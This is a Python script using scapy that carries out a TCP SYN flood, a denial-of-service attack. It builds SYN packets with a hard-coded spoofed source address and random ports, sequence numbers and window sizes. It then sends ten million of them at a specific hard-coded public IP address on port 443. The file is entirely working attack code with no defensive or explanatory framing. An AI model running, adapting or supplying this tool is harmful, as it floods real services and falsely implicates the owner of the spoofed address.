# Research:
# https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool/blob/master/SYN-Flood.py
# https://github.com/mjdubell/SYN-Flooder/blob/master/syn_flooder.py
# http://www.cs.miami.edu/home/burt/learning/Csc524.032/notes/tcp_nutshell.html

from scapy.layers.inet import *
from scapy.sendrecv import send
import argparse
import sys
from datetime import datetime

from functions import randomInt, randomPort


def SYN_Flood(destinationIP, destinationPort, amount):
    total = 0
    for x in range(0, amount):
        source_port = randomPort()
        source_sequence = randomInt()
        window = randomInt()

        IP_Packet = IP()
        IP_Packet.dst = destinationIP
        IP_Packet.src = "145.93.149.59"
        # IP_Packet.src = "127.0.0.1"
        # IP_Packet.src = randomIP()

        TCP_Packet = TCP()
        TCP_Packet.sport = source_port
        TCP_Packet.dport = destinationPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = source_sequence
        TCP_Packet.window = window

        send(IP_Packet / TCP_Packet, verbose=0)
        total += 1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)


SYN_Flood("35.241.178.69", 443,
          10000000)  # script is not far enough that it supports arguments so it's completely procedural.
